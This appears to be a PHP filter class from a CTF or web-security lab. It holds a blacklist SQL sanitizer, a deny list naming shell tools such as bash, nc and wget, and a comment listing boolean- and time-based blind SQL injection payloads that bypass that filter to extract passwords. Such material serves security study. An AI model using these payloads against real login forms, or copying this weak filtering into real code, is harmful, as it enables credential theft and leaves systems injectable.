<?php
class fiter{
	var $str;
	var $order;
	
	function sql_clean($str){
		if(is_array($str)){
			echo "<script> alert('没门！!!');parent.location.href='index.php'; </script>";exit;
		}
		$filter = "/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."/i";
		if(preg_match($filter,$str)){
			echo "<script> alert('检测到非法字符!');parent.location.href='index.php'; </script>";exit;
		}else if(strrpos($str,urldecode("%00"))){
			echo "<script> alert('检测到非法字符!');parent.location.href='index.php'; </script>";exit;
		}
		return $this->str=$str;
	}
	
	function ord_clean($ord){
		$filter = " |bash|perl|nc|java|php|>|>>|wget|ftp|python|sh";
		if (preg_match("/".$filter."/i",$ord) == 1){
			return $this->order = "";
		}
		return $this->order = $ord;
	}
	/*
	bool:
	uname='!=!!ord(mid(passwd)from(-1))>0!=!!'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)%'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)!=!!'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)^'1&passwd=dddd
	//uname=12'%(ascii(mid(user()from(-1)))=101)&'1&passwd=dddd
	uname='%2b(ascii(mid((passwd)from(-1)))=101)-'1&passwd=dddd
	/////uname=uname'=(select(1)from(admin)where(length(passwd))=33)='&passwd=1
	//uname=12'||(ascii(mid(user()from(-1)))=112)&'1&passwd=dddd
	//uname=12'||(ascii(mid(user()from(-1)))=112)!='1&passwd=dddd
	//uname=12'||(ascii(mid(user()from(-1)))=112)^'1&passwd=dddd
	time:
	uname='!=!!sleep(ascii(mid((passwd)from(-1)))=101)!=!!'1&passwd=dddd
	*/
	////uname=uname'=(select(1)from(admin)where(mid((uname)from(13))='s'))='&passwd=1
}
